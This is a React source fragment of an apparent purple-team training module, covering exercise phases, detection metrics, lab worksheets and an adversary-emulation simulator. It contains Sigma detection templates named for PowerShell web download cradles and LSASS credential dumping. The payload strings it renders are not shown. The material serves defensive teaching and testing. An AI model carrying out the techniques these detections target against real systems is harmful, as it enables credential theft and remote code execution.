                A purple team exercise is a structured collaboration between operators executing controlled simulations and defenders monitoring environments. Its purpose is to continuously eliminate blind spots, not to declare a &quot;winner&quot;.
              </p>

              {/* 22.9.1 Lifecycle & 22.9.2 Roles */}
              <div className="grid grid-cols-1 md:grid-cols-4 gap-3 text-xs mb-8 text-center">
                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <div className="font-bold text-purple-400 mb-1">Phase 1: Plan</div>
                  <div className="text-[11px] text-slate-300">Define scenario, scope, expected logs, stop conditions, and participants.</div>
                </div>
                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <div className="font-bold text-rose-400 mb-1">Phase 2: Simulate</div>
                  <div className="text-[11px] text-slate-300">Execute approved atomic test payload; log exact start/end timestamps and run ID.</div>
                </div>
                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <div className="font-bold text-cyan-400 mb-1">Phase 3: Observe</div>
                  <div className="text-[11px] text-slate-300">Verify event arrival, parser normalization, rule trigger, and SOC context.</div>
                </div>
                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <div className="font-bold text-emerald-400 mb-1">Phase 4: Improve</div>
                  <div className="text-[11px] text-slate-300">Isolate root cause of gaps, implement engineering fix, and execute retest.</div>
                </div>
              </div>

              {/* 22.9.3 Outcomes & Root Cause Table */}
              <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
                <AlertCircle className="w-4 h-4 text-purple-400" /> 22.9.3 Exercise Outcomes, Root Causes & Remediation
              </h4>

              <div className="overflow-x-auto rounded-xl border border-slate-800 mb-6">
                <table className="w-full text-xs text-left text-slate-300">
                  <thead className="bg-slate-900 text-slate-200 border-b border-slate-800 font-semibold">
                    <tr>
                      <th className="p-3">Observation</th>
                      <th className="p-3 text-rose-400">Possible Root Cause</th>
                      <th className="p-3 text-emerald-400">Engineering Improvement</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/80 font-mono text-[11px]">
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">No event appears in SIEM</td>
                      <td className="p-3">Collection or forwarding failure; endpoint agent stopped</td>
                      <td className="p-3 font-sans">Repair ingestion agent, enable audit channel, verify network syslog egress</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Event arrives without required fields</td>
                      <td className="p-3">Parser or normalization problem; schema mismatch</td>
                      <td className="p-3 font-sans">Update Grok/ECS parser mapping and add automated parser regression tests</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Events exist but no alert is generated</td>
                      <td className="p-3">Rule condition too strict; threshold higher than test count</td>
                      <td className="p-3 font-sans">Refactor Sigma rule logic, adjust threshold, test against unit cases</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Alert triggers too frequently</td>
                      <td className="p-3">Weak conditions, missing exclusions for service accounts</td>
                      <td className="p-3 font-sans">Tune baseline exclusions, add known approved test exemptions</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Alert correct but analyst cannot investigate</td>
                      <td className="p-3">Missing identity enrichment, host context, or runbook</td>
                      <td className="p-3 font-sans">Enrich alert with LDAP/Asset DB metadata and attach standard SOP link</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Activity detected but response delayed</td>
                      <td className="p-3">Escalation failure or unclear triage ownership</td>
                      <td className="p-3 font-sans">Clarify on-call routing, establish SLA deadlines, automate Tier 1 notifications</td>
                    </tr>
                  </tbody>
                </table>
              </div>
            </section>

            {/* 22.10 Security Metrics and Continuous Improvement */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  22.10 Security Metrics
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">
                Security Metrics and Continuous Improvement
              </h3>
              <p className="text-slate-300 text-sm leading-relaxed mb-6">
                Detection metrics must be grounded in precise mathematical definitions and test limitations. A high pass rate on synthetic tests does not automatically guarantee detection of unknown zero-day tradecraft.
              </p>

              {/* 22.10.1 Key Metrics Table */}
              <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2">
                <Gauge className="w-4 h-4 text-purple-400" /> 22.10.1 Key Detection Engineering Metrics
              </h4>

              <div className="overflow-x-auto rounded-xl border border-slate-800 mb-6">
                <table className="w-full text-xs text-left text-slate-300">
                  <thead className="bg-slate-900 text-slate-200 border-b border-slate-800 font-semibold">
                    <tr>
                      <th className="p-3">Metric</th>
                      <th className="p-3 text-purple-400">What it Measures</th>
                      <th className="p-3 text-amber-400">Important Operational Caveat</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-slate-800/80 font-mono text-[11px]">
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Detection Coverage</td>
                      <td className="p-3 font-sans">Relevant behaviors with validated detections</td>
                      <td className="p-3 font-sans">Depends strictly on chosen scope and test quality</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Telemetry Completeness</td>
                      <td className="p-3 font-sans">Expected events successfully collected in SIEM</td>
                      <td className="p-3 font-sans">Missing events make detection appear cleaner than reality</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Recall (True Positive Rate)</td>
                      <td className="p-3 font-sans">Proportion of genuine attacks correctly caught: TP / (TP+FN)</td>
                      <td className="p-3 font-sans">Requires a trustworthy, diverse labeled test set</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Precision</td>
                      <td className="p-3 font-sans">Fraction of alerts fired that are truly malicious: TP / (TP+FP)</td>
                      <td className="p-3 font-sans">Low precision causes alert fatigue and ignored queues</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Mean Time to Detect (MTTD)</td>
                      <td className="p-3 font-sans">Time elapsed from event execution to alert generation</td>
                      <td className="p-3 font-sans">Depends on precise baseline event timestamp accuracy</td>
                    </tr>
                    <tr className="hover:bg-slate-800/30">
                      <td className="p-3 font-sans text-white">Mean Time to Respond (MTTR)</td>
                      <td className="p-3 font-sans">Time elapsed from alert generation to containment</td>
                      <td className="p-3 font-sans">Define whether milestone is triage, isolation, or recovery</td>
                    </tr>
                  </tbody>
                </table>
              </div>

              {/* 22.10.2 Mathematical Example Calculation */}
              <div className="p-5 rounded-xl bg-slate-950/80 border border-slate-800">
                <h4 className="text-sm font-bold text-white mb-2">22.10.2 Real-World Calculation Walkthrough</h4>
                <p className="text-xs text-slate-300 mb-3">
                  Suppose a lab tests an identity analytic using 100 labeled positive adversary cases and 20 labeled benign background cases:
                </p>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs font-mono mb-4">
                  <div className="p-2.5 rounded bg-slate-900 border border-slate-800 text-emerald-400">TP = 90 (Detected)</div>
                  <div className="p-2.5 rounded bg-slate-900 border border-slate-800 text-rose-400">FN = 10 (Missed)</div>
                  <div className="p-2.5 rounded bg-slate-900 border border-slate-800 text-amber-400">FP = 2 (False Alarm)</div>
                  <div className="p-2.5 rounded bg-slate-900 border border-slate-800 text-cyan-400">TN = 18 (Benign Passed)</div>
                </div>
                <div className="space-y-2 text-xs font-mono text-purple-300 bg-slate-900 p-3 rounded border border-slate-800">
                  <div>Recall = [90 / (90 + 10)] * 100 = 90.00%</div>
                  <div>Precision = [90 / (90 + 2)] * 100 = 97.83%</div>
                  <div>F1-Score = 2 * [(97.83 * 90) / (97.83 + 90)] = 93.75%</div>
                </div>
              </div>
            </section>

            {/* 22.11 Tools and Technologies */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  22.11 Tool Ecosystem
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">
                Core Technologies for Detection and Validation
              </h3>

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4 text-xs">
                <div className="p-4 rounded-xl bg-slate-950/60 border border-slate-800">
                  <div className="font-bold text-cyan-400 mb-1 flex items-center gap-1.5">
                    <Server className="w-4 h-4" /> Wazuh
                  </div>
                  <p className="text-slate-300 mb-2">
                    Open-source security monitoring, endpoint compliance, file integrity monitoring, and SIEM alerting engine.
                  </p>
                  <a
                    href="https://documentation.wazuh.com/"
                    target="_blank"
                    rel="noreferrer"
                    className="text-cyan-400 hover:underline flex items-center gap-1 text-[11px]"
                  >
                    <span>Wazuh Documentation</span> <ExternalLink className="w-3 h-3" />
                  </a>
                </div>

                <div className="p-4 rounded-xl bg-slate-950/60 border border-slate-800">
                  <div className="font-bold text-purple-400 mb-1 flex items-center gap-1.5">
                    <FileCode className="w-4 h-4" /> Sigma HQ
                  </div>
                  <p className="text-slate-300 mb-2">
                    Generic, open detection-as-code signature format transpilable into Elastic, Splunk, Sentinel, and QRadar queries.
                  </p>
                  <a
                    href="https://github.com/SigmaHQ/sigma-specification"
                    target="_blank"
                    rel="noreferrer"
                    className="text-purple-400 hover:underline flex items-center gap-1 text-[11px]"
                  >
                    <span>Sigma Specification</span> <ExternalLink className="w-3 h-3" />
                  </a>
                </div>

                <div className="p-4 rounded-xl bg-slate-950/60 border border-slate-800">
                  <div className="font-bold text-rose-400 mb-1 flex items-center gap-1.5">
                    <Swords className="w-4 h-4" /> Atomic Red Team
                  </div>
                  <p className="text-slate-300 mb-2">
                    Library of simple, actionable, open-source tests mapped directly to the MITRE ATT&CK matrix for defensive testing.
                  </p>
                  <a
                    href="https://www.atomicredteam.io/docs/invoke-atomicredteam"
                    target="_blank"
                    rel="noreferrer"
                    className="text-rose-400 hover:underline flex items-center gap-1 text-[11px]"
                  >
                    <span>Atomic Red Team Docs</span> <ExternalLink className="w-3 h-3" />
                  </a>
                </div>
              </div>
            </section>

            {/* 22.12 Practical Lab: Build a Mini Purple Team Detection Exercise */}
            <section className="bg-gradient-to-br from-slate-900 via-slate-900/60 to-purple-950/20 border border-purple-500/30 rounded-2xl p-6 sm:p-8 shadow-xl">
              <div className="flex flex-wrap items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-semibold bg-purple-500/20 text-purple-300 border border-purple-500/30">
                  22.12 Hands-on Lab
                </span>
                <span className="text-xs text-slate-400">Estimated time: 2–3 hours</span>
              </div>
              <h3 className="text-2xl font-bold text-white mb-3">
                Practical Lab: Build a Mini Purple Team Detection Exercise
              </h3>
              <p className="text-slate-300 text-sm leading-relaxed mb-6">
                In this lab, you build a small, repeatable security validation exercise demonstrating how an event moves from adversary generation to detection, investigation, and engineering improvement.
              </p>

              {/* 22.12.1 Directory Structure & 22.12.2 Synthetic CSV */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <h4 className="text-xs font-bold text-white mb-2 flex items-center gap-2">
                    <Compass className="w-4 h-4 text-purple-400" /> 22.12.1 Workspace Structure
                  </h4>
                  <pre className="p-3 rounded bg-slate-900 border border-slate-800 text-[11px] font-mono text-slate-300">
{`purple-team-lab/
├── events.csv
├── detection-hypothesis.md
├── test-cases.md
├── findings.md
└── retest-results.md`}
                  </pre>
                </div>

                <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800">
                  <div className="flex items-center justify-between mb-2">
                    <h4 className="text-xs font-bold text-white flex items-center gap-2">
                      <Database className="w-4 h-4 text-cyan-400" /> 22.12.2 Synthetic Security Events (events.csv)
                    </h4>
                    <button
                      onClick={() => copyToClipboard(eventCsvData, "events-csv")}
                      className="flex items-center gap-1 px-2 py-0.5 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] transition"
                    >
                      {copiedCodeId === "events-csv" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>{copiedCodeId === "events-csv" ? "Copied" : "Copy CSV"}</span>
                    </button>
                  </div>
                  <pre className="p-3 rounded bg-slate-900 border border-slate-800 text-[10px] font-mono text-cyan-300 overflow-x-auto max-h-36">
                    {eventCsvData}
                  </pre>
                </div>
              </div>

              {/* 22.12.5 Interactive Purple Team Findings Worksheet */}
              <div className="p-6 rounded-xl bg-slate-950/90 border border-purple-500/30 mb-6">
                <h4 className="text-base font-bold text-white mb-2 flex items-center gap-2">
                  <Users className="w-5 h-5 text-purple-400" /> 22.12.5 Interactive Purple Team Findings Worksheet
                </h4>
                <p className="text-xs text-slate-400 mb-6">
                  Select the results observed in your lab. The report preview updates dynamically as you test hypotheses.
                </p>

                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                  <div className="space-y-4 text-xs">
                    {/* Q1 */}
                    <div>
                      <label className="block font-semibold text-slate-300 mb-1.5">
                        1. Did all expected events arrive?
                      </label>
                      <select
                        value={worksheetData.eventsArrived}
                        onChange={(e) => setWorksheetData((prev) => ({ ...prev, eventsArrived: e.target.value }))}
                        className="w-full p-2.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-200 focus:outline-none focus:border-purple-500"
                      >
                        <option value="yes">Yes — telemetry is complete</option>
                        <option value="partially">Partially — some events are missing</option>
                        <option value="no">No — expected events are absent</option>
                      </select>
                    </div>

                    {/* Q2 */}
                    <div>
                      <label className="block font-semibold text-slate-300 mb-1.5">
                        2. Did the detection trigger as expected?
                      </label>
                      <select
                        value={worksheetData.detectionTriggered}
                        onChange={(e) => setWorksheetData((prev) => ({ ...prev, detectionTriggered: e.target.value }))}
                        className="w-full p-2.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-200 focus:outline-none focus:border-purple-500"
                      >
                        <option value="yes">Yes — expected alert generated</option>
                        <option value="no">No — expected alert was missed</option>
                        <option value="excessive">Incorrect or excessive alerts occurred</option>
                      </select>
                    </div>

                    {/* Q3 */}
                    <div>
                      <label className="block font-semibold text-slate-300 mb-1.5">
                        3. Was the alert useful for investigation?
                      </label>
                      <select
                        value={worksheetData.alertUseful}
                        onChange={(e) => setWorksheetData((prev) => ({ ...prev, alertUseful: e.target.value }))}
                        className="w-full p-2.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-200 focus:outline-none focus:border-purple-500"
                      >
                        <option value="yes">Yes — sufficient account, time, and source context</option>
                        <option value="partially">Partially — some context was missing</option>
                        <option value="no">No — the analyst could not investigate effectively</option>
                      </select>
                    </div>

                    {/* Q4 */}
                    <div>
                      <label className="block font-semibold text-slate-300 mb-1.5">
                        4. Most likely gap
                      </label>
                      <select
                        value={worksheetData.mostLikelyGap}
                        onChange={(e) => setWorksheetData((prev) => ({ ...prev, mostLikelyGap: e.target.value }))}
                        className="w-full p-2.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-200 focus:outline-none focus:border-purple-500"
                      >
                        <option value="none">No gap observed</option>
                        <option value="collection">Collection or forwarding</option>
                        <option value="parsing">Parsing or field normalization</option>
                        <option value="detection">Detection or correlation logic</option>
                        <option value="enrichment">Alert enrichment or investigation workflow</option>
                      </select>
                    </div>

                    {/* Q5 */}
                    <div>
                      <label className="block font-semibold text-slate-300 mb-1.5">
                        5. Proposed improvement
                      </label>
                      <input
                        type="text"
                        value={worksheetData.proposedImprovement}
                        onChange={(e) => setWorksheetData((prev) => ({ ...prev, proposedImprovement: e.target.value }))}
                        className="w-full p-2.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-200 focus:outline-none focus:border-purple-500"
                      />
                    </div>

                    {/* Q6 */}
                    <div>
                      <label className="block font-semibold text-slate-300 mb-1.5">
                        6. Retest result
                      </label>
                      <select
                        value={worksheetData.retestResult}
                        onChange={(e) => setWorksheetData((prev) => ({ ...prev, retestResult: e.target.value }))}
                        className="w-full p-2.5 rounded-lg bg-slate-900 border border-slate-800 text-slate-200 focus:outline-none focus:border-purple-500"
                      >
                        <option value="pass">Pass — expected positive and negative cases work</option>
                        <option value="partial">Partial — some test cases still fail</option>
                        <option value="not_run">Not run yet</option>
                      </select>
                    </div>
                  </div>

                  {/* Report Preview Display */}
                  <div className="flex flex-col justify-between p-4 rounded-xl bg-slate-900/90 border border-slate-800">
                    <div>
                      <div className="flex items-center justify-between mb-3 border-b border-slate-800 pb-2">
                        <span className="text-xs font-bold text-white uppercase tracking-wider">
                          Report Preview
                        </span>
                        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-purple-500/20 text-purple-300">
                          Live Output
                        </span>
                      </div>

                      <pre className="p-3 rounded-lg bg-slate-950 font-mono text-[11px] text-purple-300 whitespace-pre-wrap leading-relaxed">
                        {reportPreviewText}
                      </pre>
                    </div>

                    <button
                      onClick={() => copyToClipboard(reportPreviewText, "report-preview")}
                      className="mt-4 w-full py-2.5 rounded-lg bg-purple-600 hover:bg-purple-500 text-white font-semibold text-xs flex items-center justify-center gap-2 transition shadow-lg"
                    >
                      {copiedCodeId === "report-preview" ? <Check className="w-4 h-4 text-white" /> : <Copy className="w-4 h-4 text-white" />}
                      <span>{copiedCodeId === "report-preview" ? "Report Copied to Clipboard!" : "Copy report"}</span>
                    </button>
                  </div>
                </div>
              </div>
            </section>

            {/* 22.14 Official References and Further Learning */}
            <section className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                  22.14 Primary Documentation
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-6">
                Official References & Standards
              </h3>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs">
                {[
                  {
                    title: "NIST SP 800-115 — Testing & Assessment",
                    desc: "Technical guide for planning and executing authorized security tests, finding analysis, and mitigation.",
                    url: "https://csrc.nist.gov/pubs/sp/800/115/final",
                  },
                  {
                    title: "NIST SP 800-61 Rev. 3 — Incident Response",
                    desc: "Modern incident response integrated with organizational cybersecurity risk management.",
                    url: "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
                  },
                  {
                    title: "MITRE ATT&CK Framework",
                    desc: "Adversary tactics, techniques, and procedures (TTPs) for threat-informed security validation.",
                    url: "https://attack.mitre.org/",
                  },
                  {
                    title: "MITRE ATT&CK Detection Strategies",
                    desc: "Modern behavioral detection strategies connecting adversary tradecraft to concrete analytics.",
                    url: "https://attack.mitre.org/detectionstrategies/",
                  },
                  {
                    title: "Sigma Rule Specification (SigmaHQ)",
                    desc: "Official open format and syntax guidelines for detection rules across supported security backends.",
                    url: "https://github.com/SigmaHQ/sigma-specification",
                  },
                  {
                    title: "Atomic Red Team Documentation",
                    desc: "Controlled adversary emulation library with granular prerequisites and execution instructions.",
                    url: "https://www.atomicredteam.io/docs/invoke-atomicredteam",
                  },
                  {
                    title: "Wazuh Documentation",
                    desc: "Endpoint security monitoring, log analysis, compliance checking, and active response workflows.",
                    url: "https://documentation.wazuh.com/",
                  },
                  {
                    title: "Elastic Security Guide",
                    desc: "Detection engine rules, event correlation, timeline investigation, and threat hunting analytics.",
                    url: "https://www.elastic.co/guide/en/security/current/index.html",
                  },
                  {
                    title: "MITRE ATT&CK Navigator",
                    desc: "Interactive visual matrix mapping for threat coverage, detection gaps, and purple team results.",
                    url: "https://attack.mitre.org/resources/attack-data-and-tools/",
                  },
                  {
                    title: "CISA Defensive Guidance",
                    desc: "Federal cybersecurity recommendations for threat hunting, SOC maturity, and resilience.",
                    url: "https://www.cisa.gov/",
                  },
                ].map((ref, idx) => (
                  <div key={idx} className="p-4 rounded-xl bg-slate-950/60 border border-slate-800 flex flex-col justify-between">
                    <div>
                      <h4 className="font-bold text-white mb-1">{ref.title}</h4>
                      <p className="text-slate-400 text-xs mb-3">{ref.desc}</p>
                    </div>
                    <a
                      href={ref.url}
                      target="_blank"
                      rel="noreferrer"
                      className="text-purple-400 hover:text-purple-300 font-medium inline-flex items-center gap-1 text-[11px]"
                    >
                      <span>Explore Official Standard</span> <ExternalLink className="w-3 h-3" />
                    </a>
                  </div>
                ))}
              </div>
            </section>

            {/* 22.15 Key Takeaways */}
            <section className="bg-gradient-to-br from-purple-950/30 via-slate-900 to-slate-950 border border-purple-500/20 rounded-2xl p-6 sm:p-8">
              <div className="flex items-center gap-2 mb-3">
                <span className="px-2.5 py-0.5 rounded-full text-xs font-semibold bg-purple-500/20 text-purple-300 border border-purple-500/30">
                  22.15 Core Summary
                </span>
              </div>
              <h3 className="text-xl font-bold text-white mb-4">Key Takeaways</h3>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs text-slate-300">
                {[
                  "Red teams test defenses through authorized adversary simulation; blue teams detect and respond; purple teams coordinate collaborative testing and systematic improvement.",
                  "Strong security operations depend on both reliable upstream telemetry and robustly engineered detection logic.",
                  "Detection engineering requires hypotheses, unit tests, validation, version control, and continuous regression testing.",
                  "MITRE ATT&CK supports threat-informed planning, but mapped coverage must be backed by reproducible evidence rather than colored cells.",
                  "Alert triage requires contextual investigation across identity, endpoint, and network data rather than assumptions based on isolated events.",
                  "Metrics such as precision, recall, detection latency, and test pass rate are useful only when their definitions and test limitations are explicit.",
                  "A successful purple team exercise identifies a specific gap, assigns ownership, implements an improvement, and demonstrates the result through validated retesting.",
                  "Written authorization, scope controls, evidence integrity, privacy safeguards, and emergency stop conditions are fundamental to responsible security testing.",
                ].map((point, idx) => (
                  <div key={idx} className="p-3.5 rounded-lg bg-slate-950/60 border border-slate-800 flex items-start gap-2.5">
                    <CheckCircle className="w-4 h-4 text-purple-400 shrink-0 mt-0.5" />
                    <span>{point}</span>
                  </div>
                ))}
              </div>
            </section>
          </div>
        )}

        {/* ================================================================== */}
        {/* TAB 2: SIMULATOR 1 - ADVERSARY EMULATION & MITRE ATT&CK MATRIX    */}
        {/* ================================================================== */}
        {activeTab === "attack-sim" && (
          <div className="space-y-8">
            <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex flex-wrap items-center justify-between gap-4 mb-6">
                <div>
                  <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-rose-500/10 text-rose-400 border border-rose-500/20">
                    Simulator 1
                  </span>
                  <h3 className="text-xl font-bold text-white mt-2">
                    Adversary Emulation & MITRE ATT&CK Matrix Navigator
                  </h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Trigger threat-informed red team simulations and observe the blue team telemetry ingestion pipeline at each stage.
                  </p>
                </div>

                <button
                  onClick={handleRunSim1}
                  disabled={sim1ExecutionRunning}
                  className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-rose-600 to-purple-600 hover:from-rose-500 hover:to-purple-500 text-white font-bold text-xs flex items-center gap-2 shadow-lg disabled:opacity-50 transition"
                >
                  <Play className="w-4 h-4 fill-current" />
                  <span>{sim1ExecutionRunning ? "Simulating Test..." : "Launch Adversary Emulation"}</span>
                </button>
              </div>

              {/* Scenario Selection Grid */}
              <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3 mb-6">
                {Object.keys(sim1Scenarios).map((key) => {
                  const sc = sim1Scenarios[key];
                  const isSelected = sim1Scenario === key;
                  return (
                    <button
                      key={key}
                      onClick={() => setSim1Scenario(key)}
                      className={`p-4 rounded-xl text-left border transition ${
                        isSelected
                          ? "bg-rose-500/10 border-rose-500 text-white"
                          : "bg-slate-950/60 border-slate-800 text-slate-400 hover:border-slate-700"
                      }`}
                    >
                      <div className="text-[10px] font-mono font-bold text-rose-400 mb-1">{sc.id}</div>
                      <div className="font-bold text-xs text-white mb-1">{sc.name}</div>
                      <div className="text-[11px] text-slate-400">{sc.tactic}</div>
                    </button>
                  );
                })}
              </div>

              {/* Pipeline Controls & Toggles */}
              <div className="p-4 rounded-xl bg-slate-950/80 border border-slate-800 mb-6">
                <div className="text-xs font-bold text-white mb-3 flex items-center gap-2">
                  <Sliders className="w-4 h-4 text-cyan-400" /> Blue Team Pipeline Health Controls (Toggle to inject failures)
                </div>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-xs">
                  <label className="flex items-center gap-2 p-2 rounded bg-slate-900 border border-slate-800 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={sim1TelemetryEnabled}
                      onChange={(e) => setSim1TelemetryEnabled(e.target.checked)}
                      className="rounded text-cyan-500 focus:ring-0"
                    />
                    <span className="text-slate-300">Sensor Active</span>
                  </label>
                  <label className="flex items-center gap-2 p-2 rounded bg-slate-900 border border-slate-800 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={sim1ParserEnabled}
                      onChange={(e) => setSim1ParserEnabled(e.target.checked)}
                      className="rounded text-cyan-500 focus:ring-0"
                    />
                    <span className="text-slate-300">Parser Valid</span>
                  </label>
                  <label className="flex items-center gap-2 p-2 rounded bg-slate-900 border border-slate-800 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={sim1RuleEnabled}
                      onChange={(e) => setSim1RuleEnabled(e.target.checked)}
                      className="rounded text-cyan-500 focus:ring-0"
                    />
                    <span className="text-slate-300">Rule Enabled</span>
                  </label>
                  <label className="flex items-center gap-2 p-2 rounded bg-slate-900 border border-slate-800 cursor-pointer">
                    <input
                      type="checkbox"
                      checked={sim1EnrichmentEnabled}
                      onChange={(e) => setSim1EnrichmentEnabled(e.target.checked)}
                      className="rounded text-cyan-500 focus:ring-0"
                    />
                    <span className="text-slate-300">SOC Enrichment</span>
                  </label>
                </div>
              </div>

              {/* Console Output & Emulation Details */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 flex flex-col justify-between">
                  <div>
                    <div className="text-xs font-bold text-white mb-2 flex items-center gap-2">
                      <Terminal className="w-4 h-4 text-rose-400" /> Active Adversary Payload
                    </div>
                    <pre className="p-3 rounded bg-slate-900 border border-slate-800 text-[11px] font-mono text-rose-300 whitespace-pre-wrap leading-relaxed mb-3">
                      {sim1Scenarios[sim1Scenario].redCommand}
                    </pre>
                    <div className="text-xs text-slate-300 space-y-1">
                      <div><strong className="text-slate-400">Telemetry:</strong> {sim1Scenarios[sim1Scenario].telemetrySource}</div>
                      <div><strong className="text-slate-400">Description:</strong> {sim1Scenarios[sim1Scenario].description}</div>
                    </div>
                  </div>

                  <a
                    href={sim1Scenarios[sim1Scenario].mitreUrl}
                    target="_blank"
                    rel="noreferrer"
                    className="mt-4 inline-flex items-center gap-1.5 text-xs text-rose-400 hover:underline"
                  >
                    <span>View {sim1Scenarios[sim1Scenario].id} on MITRE ATT&CK</span>
                    <ExternalLink className="w-3 h-3" />
                  </a>
                </div>

                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800">
                  <div className="text-xs font-bold text-white mb-2 flex items-center gap-2">
                    <Activity className="w-4 h-4 text-cyan-400" /> Telemetry & Detection Pipeline Audit
                  </div>
                  <div className="p-3 rounded bg-slate-900 border border-slate-800 min-h-[160px] font-mono text-[11px] space-y-1 text-slate-300">
                    {sim1LogOutput.length === 0 ? (
                      <div className="text-slate-600 italic">Click &quot;Launch Adversary Emulation&quot; to begin test run...</div>
                    ) : (
                      sim1LogOutput.map((log, idx) => {
                        let color = "text-slate-300";
                        if (log.startsWith("[RED TEAM]")) color = "text-rose-400";
                        if (log.startsWith("[TELEMETRY")) color = "text-cyan-400";
                        if (log.startsWith("[BLUE SOC]")) color = "text-amber-400";
                        if (log.startsWith("[PURPLE VERDICT]")) color = log.includes("VALIDATED") ? "text-emerald-400 font-bold" : "text-rose-400 font-bold";
                        return <div key={idx} className={color}>{log}</div>;
                      })
                    )}
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* ================================================================== */}
        {/* TAB 3: SIMULATOR 2 - SIGMA RULE WORKBENCH & DETECTION ENGINE       */}
        {/* ================================================================== */}
        {activeTab === "sigma-sim" && (
          <div className="space-y-8">
            <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-6 sm:p-8">
              <div className="flex flex-wrap items-center justify-between gap-4 mb-6">
                <div>
                  <span className="px-2.5 py-0.5 rounded-full text-xs font-medium bg-purple-500/10 text-purple-400 border border-purple-500/20">
                    Simulator 2
                  </span>
                  <h3 className="text-xl font-bold text-white mt-2">
                    Detection Engineering Workbench & Sigma Rule Authoring Engine
                  </h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Author portable Sigma rules as code, tune threshold parameters, and validate against live synthetic test suites.
                  </p>
                </div>

                <div className="flex items-center gap-2">
                  <button
                    onClick={() => copyToClipboard(generatedSigmaYaml, "sigma-yaml-sim")}
                    className="px-4 py-2 rounded-xl bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs flex items-center gap-2 shadow-lg transition"
                  >
                    {copiedCodeId === "sigma-yaml-sim" ? <Check className="w-4 h-4 text-emerald-300" /> : <Copy className="w-4 h-4" />}
                    <span>{copiedCodeId === "sigma-yaml-sim" ? "Copied Rule!" : "Copy Sigma Rule"}</span>
                  </button>
                </div>
              </div>

              {/* Template Selector */}
              <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mb-6">
                {[
                  { id: "auth_failure", label: "Repeated Auth Failures (T1110)", type: "Threshold Correlation" },
                  { id: "powershell_cradle", label: "PowerShell Web Cradle (T1059.001)", type: "Single-Event CLI Match" },
                  { id: "lsass_dump", label: "LSASS Process Access (T1003.001)", type: "Single-Event Object Access" },
                ].map((tpl) => (
                  <button
                    key={tpl.id}
                    onClick={() => setSigmaRuleType(tpl.id)}
                    className={`p-4 rounded-xl text-left border transition ${
                      sigmaRuleType === tpl.id
